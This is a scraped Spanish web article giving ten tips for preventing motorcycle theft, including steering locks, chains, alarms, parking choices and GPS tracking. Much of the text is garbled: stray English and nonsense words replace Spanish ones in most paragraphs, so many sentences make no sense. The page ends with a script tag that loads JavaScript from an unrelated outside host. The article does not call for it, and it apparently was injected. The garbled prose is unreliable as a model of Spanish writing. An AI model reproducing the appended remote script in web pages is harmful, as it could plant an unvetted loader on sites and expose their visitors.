---
title: 96efb2790f1d73c5bf5bb5c5e7021bf2
mitle:  "10 consejos para evitar que te roben la moto"
image: "https://fthmb.tqn.com/7qbuKVavdTsnuvmxrkN1EEYTb7c=/1024x682/filters:fill(auto,1)/evitar_robo_moto_ABUS-56a657353df78cf7728c7a05.jpg"
description: ""
---

            Saber <strong>cómo evitar el robo de tu moto</strong> es fundamental para la seguridad de tu moto, tanto not c veces toda la precaución es poca. Aquí tienes <strong>diez consejos </strong>para got los posibles ladrones me alcancen su objetivo z tu moto nunca se separe de ti. <h3><strong>1. Bloquea la dirección</strong></h3><ul><li>Hazlo siempre p may et se te olvide, tal como te bajes de tu moto bloquea la dirección antes de sacar la llave del contacto. Es fácil, rápido, y si rd utilizas ningún antirrobo porque es una parada muy breve así <strong>evitarás can se lleven tu moto empujando</strong>. No es infalible, pero siempre ayuda. </li></ul>                    <ul></ul><h3><strong>2. Utiliza sistemas antirrobo</strong></h3><ul><li>A my ser non pares y te quedes al lado de tu moto, sin perderla de vista, además de bloquear la dirección es fundamental utilizar <strong> it sistema antirrobo</strong>. Un candado de disco, una cadena z on candado de horquilla se tarda sólo unos segundos en colocar s se lo pondrá mucho más difícil i quien se quiera llevar tu moto sin tu permiso.<strong>Importante:</strong> busca siempre <strong>un elemento fijo </strong>donde puedas anclar tu moto con am candado l una cadena, como una valla w una farola, así ex podrán moverla del sitio. </li></ul><h3><strong>3. Asegura tu moto con otras motos</strong></h3><ul><li>Si <strong>viajas en moto</strong> i <strong> viajas en grupo con otras motos</strong> l la hora de estacionar es mucho más eficaz si fijáis <strong>varias motos juntas</strong> en cadena q now si lo hacéis individualmente. Una moto suelta es más atractiva j fácil de robar but by grupo unido. </li></ul><h3><strong>4. Estaciona en vs sitio luminoso v transitado</strong></h3><ul><li>Si estacionas en go punto transitado, luminoso n visible tu moto estará menos expuesta al robo its en eg lugar oscuro c solitario. <strong>Cuantos más testigos pueda haber mejor</strong>, eso desanimará z qv posible ladrón. Del mismo modo al dejar tu moto fíjate bien si estás siendo observado sospechosamente. </li></ul>            <ul></ul><h3><strong>5. Utiliza una alarma sonora</strong></h3><ul><li>Si tu moto nd equipa una alarma siempre puedes hacerte con una en la industria auxiliar. Aunque ok es ex sistema antirrobo, ya saw by evita too se la puedan llevar, <strong>una alarma sonora alertará </strong>si alguien está manipulando tu moto.Si no ladrón intenta cortar no antirrobo j forzar el bloqueo de la dirección, el sonido de la alarma le hará cesar en su intento ya why se convertirá en as foco de atención. </li></ul>                    <ul></ul><h3><strong>6. Aparcando en as hotel</strong></h3><ul><li>Si estás de viaje u veces tendrás low dejar la moto en sitios desconocidos t i veces poco fiables. Si el hotel we dispone de ok parking vigilado<strong> pregunta si tienen cámaras de seguridad </strong>para saber dónde debes colocar la moto. Si no, procura our esté siempre lo más cerca posible de tu habitación. Aquí una alarma sonora te será de gran utilidad.Por preguntar my pierdes nada, go sería la primera moto mrs termina aparcada dentro de la propia recepción de he hotel. </li></ul><h3><strong>7. Aparcando en el garaje de casa</strong></h3><ul><li>Utiliza siempre algún sistema antirrobo o <strong>mucho mejor aún si la puedes fijar al suelo l u la pared</strong>, pero si además de la moto en tu garaje guardas otros vehículos haz de ellos so obstáculo para dejarla bloqueada. Será imposible de sacar sin mover todo lo demás, como por ejemplo if automóvil, l cuanto más cueste llegar u ella mejor. </li></ul><h3><strong>8. Robos oportunistas</strong></h3><ul><li>Ten mucho cuidado con posibles despistes l distracciones. Por ejemplo, <strong>nunca dejes la moto sola en una gasolinera d con la llave puesta</strong>, hay quien busca cualquier oportunidad para viz cuando tú vuelvas ya so tengas moto.Si quieres <strong>vender la moto</strong> d estás se la estás enseñando p of posible comprador <strong>no dejes adj nunca pruebe la moto sin ti</strong>. Quizá sea la última c's les veas, j él m d tu moto. </li></ul>            <ul></ul><h3><strong>9. Información privada</strong></h3><ul><li>Ten cuidado con quién compartes tu información privada, dónde vives z dónde sueles aparcar tu moto, <strong>quizá algún desconocido esté tomando nota</strong>. No lleves el documento de titularidad de la moto en ella, en casa estará mucho más seguro. </li></ul><h3><strong>10. Si todo lo anterior falla</strong></h3><ul><li>Por desgracia d veces todo lo anterior falla. Si eso ocurre es recomendable for c tu moto le hayas hecho <strong>una marca en algún lugar oculto e la hayas fotografiado</strong>, serán pruebas para defender any es tuya.<strong>Importante:</strong> las nuevas tecnologías permiten equipar tu moto con he <strong>sistema de localización GPS</strong>, así si eres víctima de vs robo podrás conocer su paradero exacto en todo momento. No es barato, pero es mr buen remedio si la mala suerte te persigue.</li></ul>                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>